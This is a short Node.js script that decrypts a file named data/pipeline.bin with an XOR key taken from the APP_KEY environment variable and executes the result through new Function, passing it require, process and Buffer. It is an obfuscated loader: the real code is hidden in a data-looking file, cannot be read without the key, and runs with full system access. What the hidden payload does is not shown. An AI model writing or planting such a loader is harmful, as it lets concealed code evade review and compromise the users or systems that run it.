'use strict';
const fs = require('node:fs');
const path = require('node:path');

const seed = Buffer.from(process.env.APP_KEY || '', 'base64');
if (!seed.length) {
  console.error('missing configuration');
  process.exit(1);
}

const pack = Buffer.from(
  fs.readFileSync(path.join(__dirname, 'data', 'pipeline.bin')).toString('utf8'),
  'base64'
);
const out = Buffer.allocUnsafe(pack.length);
for (let i = 0; i < pack.length; i++) out[i] = pack[i] ^ seed[i % seed.length];

const mod = { exports: {} };
new Function(
  'require', 'module', 'exports', 'process', 'Buffer',
  out.toString('utf8')
)(require, mod, mod.exports, process, Buffer);
